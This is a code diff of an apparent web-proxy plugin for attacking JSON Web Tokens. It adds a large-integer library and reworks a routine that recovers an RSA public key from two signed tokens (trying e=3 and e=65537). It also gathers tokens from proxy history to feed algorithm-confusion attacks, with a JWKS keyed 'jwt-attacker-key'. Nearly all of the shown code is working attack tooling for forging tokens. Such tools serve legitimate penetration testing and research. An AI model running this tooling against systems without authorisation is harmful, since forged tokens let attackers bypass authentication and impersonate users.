@@ -99,14 +99,14 @@ function parsePKCS8RSAKey(pem) {
   const { value: d } = derReadBigInt(der, off);
   return { n, d };
 }
-function modpow(base, exp, mod) {
-  if (mod === 1n) return 0n;
+function modpow(base, exp, mod2) {
+  if (mod2 === 1n) return 0n;
   let result = 1n;
-  base = base % mod;
+  base = base % mod2;
   while (exp > 0n) {
-    if (exp & 1n) result = result * base % mod;
+    if (exp & 1n) result = result * base % mod2;
     exp >>= 1n;
-    base = base * base % mod;
+    base = base * base % mod2;
   }
   return result;
 }
@@ -203,14 +203,14 @@ var SMALL_PRIMES_GEN = (() => {
 function bytesToBigInt(buf) {
   return buf.length ? BigInt("0x" + buf.toString("hex")) : 0n;
 }
-function modpowBig(base, exp, mod) {
-  if (mod === 1n) return 0n;
+function modpowBig(base, exp, mod2) {
+  if (mod2 === 1n) return 0n;
   let result = 1n;
-  base %= mod;
+  base %= mod2;
   while (exp > 0n) {
-    if (exp & 1n) result = result * base % mod;
+    if (exp & 1n) result = result * base % mod2;
     exp >>= 1n;
-    base = base * base % mod;
+    base = base * base % mod2;
   }
   return result;
 }
@@ -487,6 +487,308 @@ function buildJWKSDocument(publicJwk, kid = "jwt-attacker-key") {
 
 // packages/backend/src/crypto/keyRecovery.ts
 import { createHash as createHash2 } from "crypto";
+
+// packages/backend/src/crypto/bignum.ts
+var LIMB_BITS = 1n << 21n;
+var BASE = 0n;
+var MASK = 0n;
+function ensureInit() {
+  if (BASE === 0n) {
+    BASE = 1n << LIMB_BITS;
+    MASK = BASE - 1n;
+  }
+}
+function norm(a) {
+  let i = a.length;
+  while (i > 0 && a[i - 1] === 0n) i--;
+  a.length = i;
+  return a;
+}
+function fromBigInt(x) {
+  ensureInit();
+  const out = [];
+  let v = x < 0n ? -x : x;
+  while (v > 0n) {
+    out.push(v & MASK);
+    v >>= LIMB_BITS;
+  }
+  return out;
+}
+function toBigInt(a) {
+  let v = 0n;
+  for (let i = a.length - 1; i >= 0; i--) v = v << LIMB_BITS | a[i];
+  return v;
+}
+function cmp(a, b) {
+  if (a.length !== b.length) return a.length < b.length ? -1 : 1;
+  for (let i = a.length - 1; i >= 0; i--) {
+    if (a[i] !== b[i]) return a[i] < b[i] ? -1 : 1;
+  }
+  return 0;
+}
+function add(a, b) {
+  ensureInit();
+  const out = [];
+  let carry = 0n;
+  const n = Math.max(a.length, b.length);
+  for (let i = 0; i < n; i++) {
+    const cur = (a[i] ?? 0n) + (b[i] ?? 0n) + carry;
+    out.push(cur & MASK);
+    carry = cur >> LIMB_BITS;
+  }
+  if (carry) out.push(carry);
+  return norm(out);
+}
+function sub(a, b) {
+  ensureInit();
+  const out = [];
+  let borrow = 0n;
+  for (let i = 0; i < a.length; i++) {
+    let cur = a[i] - (b[i] ?? 0n) - borrow;
+    if (cur < 0n) {
+      cur += BASE;
+      borrow = 1n;
+    } else borrow = 0n;
+    out.push(cur);
+  }
+  return norm(out);
+}
+function mul(a, b) {
+  ensureInit();
+  if (a.length === 0 || b.length === 0) return [];
+  const out = new Array(a.length + b.length).fill(0n);
+  for (let i = 0; i < a.length; i++) {
+    const ai = a[i];
+    let carry = 0n;
+    let j = 0;
+    for (; j < b.length; j++) {
+      const cur = out[i + j] + ai * b[j] + carry;
+      out[i + j] = cur & MASK;
+      carry = cur >> LIMB_BITS;
+    }
+    let k = i + j;
+    while (carry) {
+      const cur = out[k] + carry;
+      out[k] = cur & MASK;
+      carry = cur >> LIMB_BITS;
+      k++;
+    }
+  }
+  return norm(out);
+}
+function mulScalar(a, s) {
+  if (s === 0n || a.length === 0) return [];
+  const out = [];
+  let carry = 0n;
+  for (let i = 0; i < a.length; i++) {
+    const cur = a[i] * s + carry;
+    out.push(cur & MASK);
+    carry = cur >> LIMB_BITS;
+  }
+  while (carry) {
+    out.push(carry & MASK);
+    carry >>= LIMB_BITS;
+  }
+  return norm(out);
+}
+function shlBits(a, s) {
+  if (s === 0n || a.length === 0) return a.slice();
+  const out = [];
+  let carry = 0n;
+  for (let i = 0; i < a.length; i++) {
+    const cur = a[i] << s | carry;
+    out.push(cur & MASK);
+    carry = cur >> LIMB_BITS;
+  }
+  if (carry) out.push(carry);
+  return norm(out);
+}
+function shrBits(a, s) {
+  if (s === 0n || a.length === 0) return a.slice();
+  const out = new Array(a.length).fill(0n);
+  const lowMask = (1n << s) - 1n;
+  let carry = 0n;
+  for (let i = a.length - 1; i >= 0; i--) {
+    const cur = carry << LIMB_BITS | a[i];
+    out[i] = cur >> s;
+    carry = a[i] & lowMask;
+  }
+  return norm(out);
+}
+function divmod(u0, v0) {
+  ensureInit();
+  if (v0.length === 0) throw new Error("division by zero");
+  if (cmp(u0, v0) < 0) return [[], u0.slice()];
+  if (v0.length === 1) {
+    const d = v0[0];
+    const q2 = new Array(u0.length).fill(0n);
+    let rem2 = 0n;
+    for (let i = u0.length - 1; i >= 0; i--) {
+      const cur = rem2 << LIMB_BITS | u0[i];
+      q2[i] = cur / d;
+      rem2 = cur % d;
+    }
+    return [norm(q2), rem2 === 0n ? [] : [rem2]];
+  }
+  const n = v0.length;
+  const m = u0.length - n;
+  const shift = LIMB_BITS - nativeBitLen(v0[n - 1]);
+  const v = shlBits(v0, shift);
+  const u = shlBits(u0, shift);
+  while (u.length < m + n + 1) u.push(0n);
+  const q = new Array(m + 1).fill(0n);
+  const vTop = v[n - 1];
+  const vSecond = v[n - 2];
+  for (let j = m; j >= 0; j--) {
+    const numer = u[j + n] << LIMB_BITS | u[j + n - 1];
+    let qhat = numer / vTop;
+    let rhat = numer % vTop;
+    while (qhat >= BASE || qhat * vSecond > (rhat << LIMB_BITS) + u[j + n - 2]) {
+      qhat -= 1n;
+      rhat += vTop;
+      if (rhat >= BASE) break;
+    }
+    let borrow = 0n;
+    let carry = 0n;
+    for (let i = 0; i < n; i++) {
+      const p = qhat * v[i] + carry;
+      carry = p >> LIMB_BITS;
+      let s2 = u[j + i] - (p & MASK) - borrow;
+      if (s2 < 0n) {
+        s2 += BASE;
+        borrow = 1n;
+      } else borrow = 0n;
+      u[j + i] = s2;
+    }
+    let s = u[j + n] - carry - borrow;
+    if (s < 0n) {
+      s += BASE;
+      qhat -= 1n;
+      let c = 0n;
+      for (let i = 0; i < n; i++) {
+        const ss = u[j + i] + v[i] + c;
+        u[j + i] = ss & MASK;
+        c = ss >> LIMB_BITS;
+      }
+      s = s + c & MASK;
+    }
+    u[j + n] = s;
+    q[j] = qhat;
+  }
+  const rem = shrBits(norm(u.slice(0, n)), shift);
+  return [norm(q), rem];
+}
+function mod(a, b) {
+  return divmod(a, b)[1];
+}
+function combine(cofA, A, cofB, B) {
+  const pa = mulScalar(A, cofA < 0n ? -cofA : cofA);
+  const pb = mulScalar(B, cofB < 0n ? -cofB : cofB);
+  const aNeg = cofA < 0n;
+  const bNeg = cofB < 0n;
+  if (aNeg === bNeg) return add(pa, pb);
+  return cmp(pa, pb) >= 0 ? sub(pa, pb) : sub(pb, pa);
+}
+var WINDOW = 1n << 13n;
+function nativeBitLen(t) {
+  if (t <= 0n) return 0n;
+  let bits = 0n;
+  while (t >= 1n << 4096n) {
+    t >>= 4096n;
+    bits += 4096n;
+  }
+  while (t >= 1n << 64n) {
+    t >>= 64n;
+    bits += 64n;
+  }
+  while (t > 0n) {
+    t >>= 1n;
+    bits++;
+  }
+  return bits;
+}
+function bitLength(a) {
+  if (a.length === 0) return 0n;
+  return BigInt(a.length - 1) * LIMB_BITS + nativeBitLen(a[a.length - 1]);
+}
+function topBits(a, shift) {
+  if (shift <= 0n) return toBigInt(a);
+  const limbStart = Number(shift / LIMB_BITS);
+  const bitRem = shift % LIMB_BITS;
+  if (limbStart >= a.length) return 0n;
+  let v = 0n;
+  for (let i = a.length - 1; i >= limbStart; i--) v = v << LIMB_BITS | a[i];
+  return v >> bitRem;
+}
+var NATIVE_FINISH_BITS = 1n << 15n;
+function gcd(a0, b0, onProgress) {
+  ensureInit();
+  let u = a0.slice();
+  let v = b0.slice();
+  if (cmp(u, v) < 0) {
+    const t = u;
+    u = v;
+    v = t;
+  }
+  const startBits = Number(bitLength(u));
+  let iter = 0;
+  while (bitLength(u) > NATIVE_FINISH_BITS) {
+    if (onProgress && (iter++ & 1023) === 0) onProgress(Number(bitLength(u)), startBits);
+    const bu = bitLength(u);
+    const shift = bu > WINDOW ? bu - WINDOW : 0n;
+    let uhat = topBits(u, shift);
+    let vhat = topBits(v, shift);
+    let A = 1n, B = 0n, C = 0n, D = 1n;
+    for (; ; ) {
+      const vC = vhat + C;
+      const vD = vhat + D;
+      if (vC === 0n || vD === 0n) break;
+      const q = (uhat + A) / vC;
+      if (q !== (uhat + B) / vD) break;
+      [A, C] = [C, A - q * C];
+      [B, D] = [D, B - q * D];
+      [uhat, vhat] = [vhat, uhat - q * vhat];
+    }
+    if (B === 0n) {
+      const r = mod(u, v);
+      u = v;
+      v = r;
+    } else {
+      const newU = combine(A, u, B, v);
+      const newV = combine(C, u, D, v);
+      u = newU;
+      v = newV;
+    }
+    if (cmp(u, v) < 0) {
+      const t = u;
+      u = v;
+      v = t;
+    }
+  }
+  let x = toBigInt(u);
+  let y = toBigInt(v);
+  while (y !== 0n) {
+    [x, y] = [y, x % y];
+  }
+  return fromBigInt(x);
+}
+function pow(base, exp, onProgress) {
+  ensureInit();
+  let result = [1n];
+  let b = base.slice();
+  let e = exp;
+  const total = exp.toString(2).length;
+  let done = 0;
+  while (e > 0n) {
+    if (e & 1n) result = mul(result, b);
+    e >>= 1n;
+    if (e > 0n) b = mul(b, b);
+    onProgress?.(++done, total);
+  }
+  return result;
+}
+
+// packages/backend/src/crypto/keyRecovery.ts
 var DIGEST_INFO2 = {
   sha256: Buffer.from("3031300d060960864801650304020105000420", "hex"),
   sha384: Buffer.from("3041300d060960864801650304020205000430", "hex"),
@@ -497,11 +799,16 @@ var ALG_TO_HASH = {
   RS384: "sha384",
   RS512: "sha512"
 };
-function gcd(a, b) {
-  while (b !== 0n) {
-    [a, b] = [b, a % b];
+function modpow2(base, exp, mod2) {
+  if (mod2 === 1n) return 0n;
+  let result = 1n;
+  base %= mod2;
+  while (exp > 0n) {
+    if (exp & 1n) result = result * base % mod2;
+    exp >>= 1n;
+    base = base * base % mod2;
   }
-  return a < 0n ? -a : a;
+  return result;
 }
 function buildEM(hash, hashAlg, keyLen) {
   const di = DIGEST_INFO2[hashAlg];
@@ -544,99 +851,60 @@ ${lines}
 -----END PUBLIC KEY-----
 `;
 }
-var SMALL_PRIMES = [
-  2n,
-  3n,
-  5n,
-  7n,
-  11n,
-  13n,
-  17n,
-  19n,
-  23n,
-  29n,
-  31n,
-  37n,
-  41n,
-  43n,
-  47n,
-  53n,
-  59n,
-  61n,
-  67n,
-  71n,
-  73n,
-  79n,
-  83n,
-  89n,
-  97n,
-  101n,
-  103n,
-  107n,
-  109n,
-  113n,
-  127n,
-  131n,
-  137n,
-  139n,
-  149n,
-  151n,
-  157n,
-  163n,
-  167n,
-  173n,
-  179n,
-  181n,
-  191n,
-  193n,
-  197n,
-  199n,
-  211n,
-  223n,
-  227n,
-  229n,
-  233n,
-  239n,
-  241n
-];
-function stripSmallFactors(n) {
-  for (const p of SMALL_PRIMES) {
-    while (n % p === 0n) n /= p;
-  }
-  return n;
-}
-async function recoverRSAPublicKey(jwt1, jwt2, onProgress) {
-  const alg = jwt1.header.alg;
+async function recoverRSAPublicKey(jwt0, jwt1, onProgress) {
+  const alg = jwt0.header.alg;
   if (!ALG_TO_HASH[alg]) throw new Error(`Unsupported algorithm: ${alg}`);
   const hashAlg = ALG_TO_HASH[alg];
+  const sig0 = b64urlDecode(jwt0.signatureB64);
   const sig1 = b64urlDecode(jwt1.signatureB64);
-  const sig2 = b64urlDecode(jwt2.signatureB64);
-  const keyLen = sig1.length;
-  onProgress?.(`Signature length: ${keyLen * 8} bits, computing hashes\u2026`);
-  const msg1 = `${jwt1.headerB64}.${jwt1.payloadB64}`;
-  const msg2 = `${jwt2.headerB64}.${jwt2.payloadB64}`;
-  const h1 = createHash2(hashAlg).update(msg1).digest();
-  const h2 = createHash2(hashAlg).update(msg2).digest();
-  const em1 = buildEM(h1, hashAlg, keyLen);
-  const em2 = buildEM(h2, hashAlg, keyLen);
+  const keyLen = sig0.length;
+  const h0 = createHash2(hashAlg).update(`${jwt0.headerB64}.${jwt0.payloadB64}`).digest();
+  const h1 = createHash2(hashAlg).update(`${jwt1.headerB64}.${jwt1.payloadB64}`).digest();
+  const m0 = buildEM(h0, hashAlg, keyLen);
+  const m1 = buildEM(h1, hashAlg, keyLen);
+  const s0 = bufferToBigint(sig0);
   const s1 = bufferToBigint(sig1);
-  const s2 = bufferToBigint(sig2);
-  onProgress?.(`Computing s1^e (this may take up to a minute)\u2026`);
-  const e = 65537n;
-  const s1e = s1 ** e;
-  onProgress?.(`Computing s2^e\u2026`);
-  const s2e = s2 ** e;
-  onProgress?.(`Computing residuals and GCD\u2026`);
-  const r1 = s1e - em1;
-  const r2 = s2e - em2;
-  let nCandidate = gcd(r1 < 0n ? -r1 : r1, r2 < 0n ? -r2 : r2);
-  onProgress?.(`Raw GCD computed (${nCandidate.toString(16).length / 2} bytes), removing small factors\u2026`);
-  nCandidate = stripSmallFactors(nCandidate);
-  const bitLen = nCandidate.toString(2).length;
-  if (bitLen < 512) throw new Error(`Recovered modulus too small (${bitLen} bits) \u2014 likely an incorrect pair`);
-  onProgress?.(`Recovered ${bitLen}-bit modulus. Building public key\u2026`);
-  const pem = bigintToPublicKeyPem(nCandidate);
-  return { publicKeyPem: pem, modulusBits: bitLen };
+  const s0bn = fromBigInt(s0);
+  const s1bn = fromBigInt(s1);
+  const m0bn = fromBigInt(m0);
+  const m1bn = fromBigInt(m1);
+  for (const e of [3n, 65537n]) {
+    try {
+      onProgress?.(`e=${e}: computing sig^e (~16 MB integers; this can take a few minutes)\u2026`);
+      const p0 = pow(s0bn, e);
+      const p1 = pow(s1bn, e);
+      if (cmp(p0, m0bn) < 0 || cmp(p1, m1bn) < 0) continue;
+      const A = sub(p0, m0bn);
+      const B = sub(p1, m1bn);
+      onProgress?.(`e=${e}: computing GCD (the slow step \u2014 several minutes)\u2026`);
+      let lastPct = -1;
+      const g = gcd(A, B, (remaining, start) => {
+        const pct = Math.min(99, Math.floor((1 - remaining / start) * 100));
+        if (pct !== lastPct) {
+          lastPct = pct;
+          onProgress?.(`e=${e}: GCD ${pct}%\u2026`);
+        }
+      });
+      const gInt = toBigInt(g);
+      const validates = (nc) => nc > 1n && modpow2(s0, e, nc) === (m0 % nc + nc) % nc;
+      for (let k = 1n; k <= 100n; k++) {
+        if (gInt % k !== 0n) continue;
+        let nCand = gInt / k;
+        if (nCand.toString(2).length < 1024) continue;
+        if (!validates(nCand)) continue;
+        for (const p of [2n, 3n, 5n, 7n, 11n, 13n]) {
+          while (nCand % p === 0n && validates(nCand / p)) nCand /= p;
+        }
+        const bits = nCand.toString(2).length;
+        onProgress?.(`Recovered ${bits}-bit modulus (e=${e}). Building public key\u2026`);
+        return { publicKeyPem: bigintToPublicKeyPem(nCand, e), modulusBits: bits };
+      }
+      onProgress?.(`e=${e}: no valid modulus from the GCD.`);
+    } catch (err) {
+      onProgress?.(`e=${e} failed: ${err.message}`);
+    }
+  }
+  throw new Error("Could not recover a modulus for e=3 or e=65537 from this JWT pair");
 }
 async function recoverPublicKeyFromJWTs(jwts, onProgress) {
   const rsJwts = jwts.filter((j) => j.header.alg && ALG_TO_HASH[j.header.alg]);
@@ -1868,13 +2136,20 @@ async function attackJwt(sdk, requestId, config) {
         sdk.api.send("jwt-attack-result", { sessionId, result: attack });
       }
     };
+    let recoveryCandidates = [];
+    if (cfg.enabledAttacks.algConfusion && cfg.enableKeyRecovery) {
+      try {
+        recoveryCandidates = await collectHistoryJWTs(sdk, request.getHost(), 50);
+      } catch {
+      }
+    }
     const firstWave = [baseline, ...attacks];
     sdk.api.send("jwt-attack-started", { sessionId, requestId, total: firstWave.length });
     await sendAttacks(firstWave);
     if (cfg.enabledAttacks.algConfusion && cfg.enableKeyRecovery) {
       try {
         const host = request.getHost();
-        const historyJWTs = await collectHistoryJWTs(sdk, host, 25);
+        const historyJWTs = recoveryCandidates;
         if (historyJWTs.length >= 2) {
           sdk.api.send("jwt-key-recovery-progress", {
             sessionId,
@@ -2053,24 +2328,26 @@ function flattenHeaders(headers) {
 }
 async function collectHistoryJWTs(sdk, host, limit) {
   const results = [];
-  const seen = /* @__PURE__ */ new Set();
+  const seenSig = /* @__PURE__ */ new Set();
   try {
     const page = await sdk.requests.query().filter(`req.host.eq:"${host}"`).descending("req", "id").first(limit).execute();
     const conn = page;
     for (const item of conn.items ?? []) {
       if (!item.request) continue;
+      const src = (item.request.getSource?.() ?? "").toLowerCase();
+      if (src.includes("replay") || src.includes("automate") || src.includes("workflow")) continue;
       const spec = item.request.toSpec();
       const locs = findJWTsInSpec(spec);
       for (const loc of locs) {
-        if (seen.has(loc.jwt)) continue;
-        seen.add(loc.jwt);
         try {
           const parsed = parseJWT(loc.jwt);
           const fam = getAlgorithmFamily(parsed.header.alg);
-          if ((fam === "RS" || fam === "PS") && parsed.signatureB64) {
-            results.push(parsed);
-            if (results.length >= 10) return results;
-          }
+          if (!(fam === "RS" || fam === "PS") || !parsed.signatureB64) continue;
+          if (parsed.header.kid === SPOOF_KID) continue;
+          if (seenSig.has(parsed.signatureB64)) continue;
+          seenSig.add(parsed.signatureB64);
+          results.push(parsed);
+          if (results.length >= 10) return results;
         } catch {
         }
       }
